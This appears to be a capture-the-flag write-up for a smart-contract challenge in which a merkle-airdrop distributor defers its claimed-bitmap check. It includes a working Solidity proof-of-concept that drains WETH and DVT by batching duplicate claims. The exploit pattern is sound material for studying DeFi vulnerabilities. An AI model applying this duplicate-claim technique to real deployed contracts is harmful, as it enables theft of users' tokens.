# The Rewarder

## Challenge Overview

`TheRewarderDistributor` contract implements [merkle proof](https://medium.com/crypto-0-nite/merkle-proofs-explained-6dd429623dc5) airdrops of WETH and DVT tokens.

There a critical vulnerability in the contract. Save as many tokens as you can from the distributor. Transfer all recovered assets to the recovery account.

## Vulnerability Analysis
 
`TheRewarderDistributor` incorrectly defers claim validation inside `claimRewards`, allowing repeated batch claims.

### 1) Deferred bitmap validation (Critical)

The contract only calls `_setClaimed` when the token changes or on the final loop iteration. Since `_setClaimed` is the only place that checks whether a batch was already claimed, duplicate claims for the same token are never detected during iteration.

### 2) Bitmap word mismatch (Secondary)

`claimRewards` fails to update the bitmap when `wordPosition` changes. If claims span multiple 256-batch words, only the final word’s bitmap is written.

## Exploit Strategy

The exploit requires control of an address included in the Merkle tree. 

To drain the distributor, calculate the number of claims possible for both token. The `inputClaims` array should be populated such that all claims of one token are completed before claims of the other token. 

## Proof of Concept

```solidity
function test_theRewarder() public checkSolvedByPlayer {
    bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
    bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");

    // address("player") is in the merkle tree
    uint256 indexOfPlayer = 188;

    uint256 dvtClaimAmount = 11524763827831882;
    uint256 dvtNumberOfClaims = distributor.getRemaining(address(dvt)) / dvtClaimAmount;

    uint256 wethClaimAmount = 1171088749244340;
    uint256 wethNumberOfClaims = distributor.getRemaining(address(weth)) / wethClaimAmount;

    IERC20[] memory tokensToClaim = new IERC20[](2);
    tokensToClaim[0] = IERC20(address(dvt));
    tokensToClaim[1] = IERC20(address(weth));

    Claim[] memory claims = new Claim[](dvtNumberOfClaims + wethNumberOfClaims);
    bytes32[] memory dvtClaimProof = merkle.getProof(dvtLeaves, indexOfPlayer);
    bytes32[] memory wethClaimProof = merkle.getProof(wethLeaves, indexOfPlayer);

    for (uint256 i = 0; i < dvtNumberOfClaims; i++) {
        claims[i] = Claim({
            batchNumber: 0,
            amount: dvtClaimAmount,
            tokenIndex: 0,
            proof: dvtClaimProof
        });
    }
    for (uint256 i = 0; i < wethNumberOfClaims; i++) {
        claims[dvtNumberOfClaims + i] = Claim({
            batchNumber: 0,
            amount: wethClaimAmount,
            tokenIndex: 1,
            proof: wethClaimProof
        });
    }

    distributor.claimRewards({
        inputClaims: claims,
        inputTokens: tokensToClaim
    });

    weth.transfer(recovery, weth.balanceOf(address(player)));
    dvt.transfer(recovery, dvt.balanceOf(address(player)));
}
```

## Result

Tokens held by the distributor will be rescued and sent to the recovery account.
